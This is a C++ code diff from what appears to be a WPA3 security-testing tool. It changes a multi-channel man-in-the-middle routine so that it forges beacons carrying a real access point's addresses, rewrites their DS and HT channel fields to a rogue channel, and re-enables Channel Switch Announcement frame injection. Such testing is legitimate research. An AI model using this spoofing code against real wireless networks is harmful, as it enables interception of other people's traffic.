@@ -49,18 +49,32 @@ namespace wpa3_tester{
     void McMitm::send_fake_real_beacon_on_real_chan() const{
         auto* fake = beacon_old->clone();
         fake->addr1(Dot11::BROADCAST);
+        fake->addr2(beacon_old->addr2());
+        fake->addr3(beacon_old->addr3());
         fake->addr4(Dot11::BROADCAST);
 
-        uint8_t ch = netconfig.rogue_channel;
-        fake->remove_option(Dot11::DS_SET);
-        fake->add_option({Dot11::DS_SET, 1, &ch});
+        for (const auto& opt : beacon_old->options()) {
+            if (opt.option() == Dot11::DS_SET) {
+                uint8_t ch = netconfig.rogue_channel;
+                fake->add_option({Dot11::DS_SET, 1, &ch});
+                continue;
+            }
+            if (opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
+                vector ht(opt.data_ptr(), opt.data_ptr() + opt.data_size());
+                ht[0] = netconfig.rogue_channel;
+                fake->add_option({Dot11::HT_OPERATION, ht.size(), ht.data()});
+                continue;
+            }
+            fake->add_option(opt);
+        }
 
-        const auto now_us = duration_cast<microseconds>(
-            steady_clock::now().time_since_epoch()).count();
-        fake->timestamp(now_us + 1000000); // +1 sekunda dopředu
+        const auto now_us = duration_cast<microseconds>(steady_clock::now().time_since_epoch()).count();
+        const auto actual_beacon = beacon->clone();
+        actual_beacon->timestamp(now_us);
+        actual_beacon->seq_num(sn++);
 
-        RadioTap rt;
-        //const int freq_mhz = hw_capabilities::channel_to_freq(netconfig.real_channel);
+        RadioTap rt{};
+        const int freq_mhz = hw_capabilities::channel_to_freq(netconfig.real_channel);
         //rt.channel(freq_mhz, RadioTap::OFDM);
         //rt.flags(RadioTap::FCS);
         rt.inner_pdu(fake);
@@ -134,7 +148,7 @@ namespace wpa3_tester{
             try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);
 
             if (next_beacon <= now_sec()) {
-                //CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+                CSA_attack::send_CSA_beacon(ap_mac, r_client_iface, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
 
                 send_fake_real_beacon_on_real_chan();
 
@@ -144,9 +158,8 @@ namespace wpa3_tester{
                 //log(LogLevel::INFO, "Beacon DS channel: %d", beacon->ds_parameter_set());
                 const auto actual_beacon = beacon->clone();
                 //log(LogLevel::INFO, "Clone DS channel: %d", actual_beacon->ds_parameter_set());
-
-                //actual_beacon->timestamp(now_us);
-                //actual_beacon->seq_num(sn++);
+                actual_beacon->timestamp(now_us);
+                actual_beacon->seq_num(sn++);
                 rt.inner_pdu(actual_beacon);
                 sender_rogue->send(rt, r_ap_iface);
 
